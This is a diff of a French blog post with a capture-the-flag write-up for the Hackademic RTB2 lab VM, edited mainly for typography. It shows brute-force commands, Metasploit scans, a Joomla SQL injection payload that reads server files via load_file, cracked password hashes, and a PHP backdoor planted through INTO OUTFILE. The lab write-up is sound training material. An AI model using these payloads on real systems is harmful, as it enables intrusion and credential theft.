@@ -44,11 +44,11 @@ Il existe bien une façon "officielle" de connaître la présence du port-knocke
 
 Coup de gueule mis à part, on s'intéresse d'abord au site web sur le port 80.  
 
-On a une page de login qui soumet via POST les identifiants vers un fichier *check.php*. On lance *Wapiti* pour trouver une vulbérabilité : nada. On teste avec *SQLmap* : pas mieux. *w3af* ? que dalle.  
+On a une page de login qui soumet via POST les identifiants vers un fichier `check.php`. On lance *Wapiti* pour trouver une vulnérabilité : nada. On teste avec *SQLmap* : pas mieux. *w3af* ? que dalle.  
 
-Du coup on cherche ailleurs en lançant [dirb](http://dirb.sourceforge.net/) (j'ai réduit l'output) :  
+Du coup, on cherche ailleurs en lançant [dirb](http://dirb.sourceforge.net/) (j'ai réduit l'output) :  
 
-```bash
+```console
 $ ./dirb http://192.168.1.91/ wordlists/big.txt 
 
 -----------------
@@ -76,9 +76,9 @@ GENERATED WORDS: 20458
 DOWNLOADED: 347786 - FOUND: 10
 ```
 
-On voit la présence d'un *phpMyAdmin* installé. Si on demande */phpmyadmin/changelog.php* on obtient facilement la version : *3.3.2.0 (2010-04-13)*  
+On voit la présence d'un *phpMyAdmin* installé. Si on demande `/phpmyadmin/changelog.php` on obtient facilement la version : *3.3.2.0 (2010-04-13)*  
 
-On trouve quelques exploits sur le web qui pourraient éventuellement affecter cette version mais certains se base sur l'accès aux scripts dans le dossier libraries qui est ici refusé.  
+On trouve quelques exploits sur le web qui pourraient éventuellement affecter cette version, mais certains se base sur l'accès aux scripts dans le dossier libraries qui est ici refusé.  
 
 Les exploits de *Metasploit* échouent aussi.  
 
@@ -88,13 +88,13 @@ J'ai testé énormément d'attaques brute-force par exemple en attaquant l'accè
 medusa -h 192.168.1.91 -U dico.txt -P candidates.txt -m DIR:phpmyadmin/setup -M http
 ```
 
-et aussi avec un script fait maison pour le *check.php* ainsi que des scripts pour essayer de trouver d'autres fichiers + tentatives d'injection dans les entêtes HTTP.  
+Et aussi avec un script fait maison pour le `check.php` ainsi que des scripts pour essayer de trouver d'autres fichiers + tentatives d'injection dans les entêtes HTTP.  
 
 Au final j'ai même réussi à faire crasher le serveur *MySQL* en backend :D ce qui m'a poussé à chercher la précieuse astuce.  
 
 Une fois le port 666 ouvert (on relance des scans, jusqu'à avoir de la chance, c'est comme au loto), tout va plus vite.  
 
-On tombe sur une installation *Joomla* (un site sur lequel on voit une signature "Joomla templates" en bas. *Metasploit* a plusieurs modules pour ce CMS :  
+On tombe sur une installation *Joomla* (un site sur lequel on voit une signature _Joomla templates_ en bas. *Metasploit* a plusieurs modules pour ce CMS :  
 
 ```
 msf> use auxiliary/scanner/http/joomla_plugins
@@ -134,7 +134,7 @@ msf auxiliary(joomla_plugins) > exploit
 [+] 192.168.1.91:666 - Vulnerability: Potential SQL Injection
 ```
 
-Le script *Metasploit* crashe à ce moment j'ai au moins il a détecté quelque chose. Au passage *Wapiti* trouve aussi la vulnérabilité mais via une autre variable :
+Le script *Metasploit* crashe à ce moment, mais au moins il a détecté quelque chose. Au passage *Wapiti* trouve aussi la vulnérabilité, mais via une autre variable :
 
 ```
 Injection MySQL dans http://192.168.1.91:666/index.php via une injection dans le paramètre letter
@@ -143,7 +143,7 @@ Injection MySQL dans http://192.168.1.91:666/index.php via une injection dans le
 
 Sur *exploit-db* on trouve [un exploit qui permet de récolter les hashs des utilisateurs Joomla](http://www.exploit-db.com/exploits/12429/) et [sur la mailing-list de JtR](http://comments.gmane.org/gmane.comp.security.openwall.john.user/4664), la manipulation pour casser ces hashs.  
 
-On obtient rapidement un premier hash et plus tard un second mais le dernier semble inaccessible :  
+On obtient rapidement un premier hash et plus tard un second, mais le dernier semble inaccessible :  
 
 ```
 Loaded 3 password hashes with 3 different salts (dynamic_1: md5($p.$s) (joomla) [128/128 AVX intrinsics 10x4x3])
@@ -151,17 +151,17 @@ matrix           (JSmith)
 victim           (BTallor)
 ```
 
-Cela dis, même avec ces comptes on ne trouve pas grand chose d'intéressant dans Joomla qui puisse nous aider à élever nos privilèges ou obtenir un shell.  
+Cela dis, même avec ces comptes, on ne trouve pas grand-chose d'intéressant dans Joomla qui puisse nous aider à élever nos privilèges ou obtenir un shell.  
 
-On customize un peu l'injection SQL indiquée dans l'exploit en changeant le paramètre de la variable *sectionid*. De cette façon on peut lire le contenu de fichiers sur le système :  
+On customise un peu l'injection SQL indiquée dans l'exploit en changeant le paramètre de la variable `sectionid`. De cette façon, on peut lire le contenu de fichiers sur le système :  
 
 ```
 -null+union+select+1,load_file(%27/etc/apache2/apache2.conf%27)+from+jos_users--
 ```
 
-La config est basée sur le dossier *sites-enabled* comme sous *openSUSE*. On tente le fichier *default* (*sites-available/default*) :  
+La config est basée sur le dossier `sites-enabled` comme sous *openSUSE*. On tente le fichier `default` (`sites-available/default`) :  
 
-```
+```apache
 <VirtualHost *:80>
 	ServerAdmin webmaster@localhost
 
@@ -199,9 +199,9 @@ La config est basée sur le dossier *sites-enabled* comme sous *openSUSE*. On te
 </VirtualHost>
 ```
 
-Bingo ! Donc le *Joomla* est dans */var/www* et le site sur le port standard dans le sous-dossier *welcome*.  
+Bingo ! Donc le *Joomla* est dans `/var/www` et le site sur le port standard dans le sous-dossier `welcome`.  
 
-Par la même méthode on récupère le password de la base de données via la lecture du fichier de configuration de *Joomla* (*/var/www/configuration.php*) :  
+Par la même méthode, on récupère le password de la base de données via la lecture du fichier de configuration de *Joomla* (`/var/www/configuration.php`) :  
 
 ```php
 class JConfig {
@@ -223,17 +223,17 @@ var $gzip = '0';
 }
 ```
 
-Avec les identifiants on se connecte sur *phpMyAdmin* puis on place une backdoor PHP via l'utilisation de l'instruction *INTO OUTFILE* :  
+Avec les identifiants, on se connecte sur *phpMyAdmin* puis on place une backdoor PHP via l'utilisation de l'instruction `INTO OUTFILE` :  
 
 ![INTO OUTFILE backdoor creation](/assets/img/into_outfile.png)
 
-On utilise cette backdoor pour rappatrier un *tshd* et obtenir un accès terminal. On dispose des droits de l'utilisateur *www-data* et on a affaire à un kernel 2.6.32 :  
+On utilise cette backdoor pour rapatrier un `tshd` et obtenir un accès terminal. On dispose des droits de l'utilisateur `www-data` et on a affaire à un kernel 2.6.32 :  
 
 *Linux HackademicRTB2 2.6.32-24-generic #39-Ubuntu SMP Wed Jul 28 06:07:29 UTC 2010 i686 GNU/Linux*  
 
-Du coup on réutilise l'exploit RDS pour le kernel pour passer root ([comme pour le RTB1]({% link _posts/2014-03-31-Solution-du-CTF-Hackademic-RTB1-de-VulnHub.md %})) et quand on affiche le contenu de */root/Key.txt* on a une longue chaîne en base64.  
+Du coup, on réutilise l'exploit RDS pour le kernel pour passer root ([comme pour le RTB1]({% link _posts/2014-03-31-Solution-du-CTF-Hackademic-RTB1-de-VulnHub.md %})) et quand on affiche le contenu de `/root/Key.txt` on a une longue chaîne en base64.  
 
-Une fois le fichier décodé (*base64 -d key.txt > file.out*) on obtient la clé suivante :  
+Une fois le fichier décodé (`base64 -d key.txt > file.out`) on obtient la clé suivante :  
 
 ![Image obtenue via decodage base64](/assets/img/rtb2_flag.png)
 
@@ -242,7 +242,7 @@ Victoire !
 Sous le capot
 -------------
 
-Bon maintenant qu'on a terminé, jettons un coup d'œil à ce fameux script *check.php* qui m'a tant énervé (j'ai coupé l'output une fois de plus car c'est super long) :  
+Bon maintenant qu'on a terminé, jetons un coup d'œil à ce fameux script `check.php` qui m'a tant énervé (j'ai coupé l'output une fois de plus, car c'est super long) :  
 
 ```php
 $pass_answer = "' or 1=1--'";
@@ -271,16 +271,16 @@ else{
 }
 ```
 
-Si quelqu'un tente d'injecter la chaine **' or 1=1--'** (apostrophes includes) alors l'indice est donné.  
+Si quelqu'un tente d'injecter la chaine `' or 1=1--'` (apostrophes includes) alors l'indice est donné.  
 
 Sauf que :  
 
 * c'est stupide de mettre une apostrophe en fin alors qu'on ferme la requête via l'utilisation d'un commentaire (wtf !)
-* ce n'est pas réaliste du tout car il n'y a pas vraiment de faille
-* ce n'est pas réaliste du tout car c'est presque une porte dérobée volontaire
+* ce n'est pas réaliste du tout, car il n'y a pas vraiment de faille
+* ce n'est pas réaliste du tout, car c'est presque une porte dérobée volontaire
 * ça ne fonctionne pas si on rentre par exemple or 1=1 or 2=2
 
-donc quelque part, pas de regrets de ne pas avoir trouvé.  
+Donc quelque part, pas de regrets de ne pas avoir trouvé.  
 
 La chaîne est une représentation hexadécimale qui a été ensuite urlencodée. En sens inverse et avec Python on fait :  
 
@@ -293,14 +293,14 @@ Knock Knock Knockin' on heaven's door .. :)
 <--------->
 ```
 
-Cette fois on a des caractères sous forme binaire. Une fois décodé on remarque un séparateur (:) dont le décodage donne :  
+Cette fois, on a des caractères sous forme binaire. Une fois décodé on remarque un séparateur (:) dont le décodage donne :  
 
 ```python
 >>> ''.join([chr(int(port, 2)) for port in ports.split(" ")]).split(':')
 ['1001', '1101', '1011', '1001']
 ```
 
-A priori les ports sont 1001, 1101, 1011 puis 1001 pour provoquer l'ouverture du port 666. Cela dis ils sont mal choisis car ils laissent supposer qu'on a encore affaire à du binaire.  
+A priori les ports sont 1001, 1101, 1011 puis 1001 pour provoquer l'ouverture du port 666. Cela dis ils sont mal choisis, car ils laissent supposer qu'on a encore affaire à du binaire.  
 
 À noter que le fichier de configuration de [knockkock](http://www.thoughtcrime.org/software/knockknock/) présent sur le système ne correspond pas à ces ports :  
 
